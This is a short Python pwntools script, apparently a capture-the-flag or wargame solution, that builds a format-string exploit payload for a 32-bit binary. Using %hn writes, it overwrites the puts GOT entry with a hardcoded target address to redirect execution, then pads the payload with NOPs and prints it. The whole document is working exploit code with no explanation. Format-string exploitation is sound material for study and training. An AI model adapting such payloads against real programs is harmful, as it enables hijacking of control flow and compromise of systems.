from pwn import *

target = 0x080499d7
puts_got = 0x0804c06c

def pad(s):
    return s + "\x90"*(256-len(s))

small = 0x0804 - 12 - 5*8
large = 0x99d7 - 0x0804

payload  = p32(puts_got + 2)
payload += "@@@@"
payload += p32(puts_got)
payload += "%.8x" * 5 + "%." + str(small) + "x%hn%." \
                             + str(large) + "x%hn" 

payload = pad(payload)

print(payload)